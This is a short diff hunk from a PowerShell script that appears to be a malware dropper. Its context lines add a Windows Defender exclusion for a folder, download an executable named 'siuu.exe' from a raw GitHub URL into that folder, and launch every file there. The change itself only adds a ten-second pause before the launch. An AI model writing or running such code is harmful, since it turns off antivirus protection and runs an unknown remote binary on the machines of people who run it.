@@ -34,6 +34,8 @@ Add-MpPreference -ExclusionPath $dir
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"
 
+Start-Sleep -Seconds 10
+
 Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
     Write-Output $_.FullName
     Start-Process -FilePath $_.FullName
